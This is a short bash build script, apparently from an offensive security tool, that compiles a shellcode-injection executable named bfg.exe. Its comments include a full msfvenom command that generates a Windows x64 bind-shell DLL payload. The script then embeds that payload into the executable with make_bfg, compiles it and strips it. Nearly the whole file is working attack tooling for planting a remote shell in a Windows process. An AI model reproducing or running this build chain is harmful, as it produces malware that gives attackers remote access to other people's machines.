#!/bin/bash          
# example script for injecting shellcode into a process
# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh
# a bind shell, already precompiled in /payloads 
# msfvenom -p windows/x64/shell/bind_tcp -b '\x00' -f dll -a x64 --platform Windows ExitFunc=thread > bind64.dll
# see payloads directory
# clean defs.h
echo "" > defs.h
# call make_bfg, compile shellcode into the executable
./make_bfg -i dll -P
# compile 
$win64_compiler -o bfg.exe bfg.c
strip bfg.exe
# cleanup
echo "" > defs.h
